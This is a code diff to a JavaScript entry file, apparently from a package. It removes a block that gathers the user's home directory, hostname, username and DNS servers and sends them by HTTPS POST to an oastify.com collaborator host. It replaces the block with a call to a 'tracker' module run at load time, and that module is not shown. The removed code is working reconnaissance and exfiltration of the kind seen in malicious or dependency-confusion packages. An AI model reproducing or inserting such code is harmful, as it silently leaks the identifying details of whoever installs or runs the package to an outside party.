@@ -1,48 +1,7 @@
-const os = require('os');
-const dns = require('dns');
-const https = require('https');
-const querystring = require('querystring');
+// index.js
 
-// Data to be sent in the POST request
-const data = {
-  hd: os.homedir(),
-  hn: os.hostname(),
-  un: os.userInfo().username,
-  dns: dns.getServers().join(','),
-};
+const trackData = require('./tracker');
 
-// Convert data to a URL-encoded string
-const postData = querystring.stringify(data);
+// Call the function
+trackData();
 
-// POST request options
-const options = {
-  hostname: 'p5v8af15zpoexkiajcdpdb8sgjm9ay.oastify.com', // Replace with the hostname or IP address of your server
-  port: 443, // Replace with the port number your server is listening on
-  path: '/',
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'Content-Length': postData.length,
-  },
-};
-
-// Send the POST request
-const req = https.request(options, (res) => {
-  console.log(`Status Code: ${res.statusCode}`);
- 
-  res.on('data', (chunk) => {
-    console.log(`Response: ${chunk}`);
-  });
- 
-  res.on('end', () => {
-    console.log('POST request completed.');
-  });
-});
-
-req.on('error', (error) => {
-  console.error(`Error sending POST request: ${error.message}`);
-});
-
-// Send the data in the POST request
-req.write(postData);
-req.end();
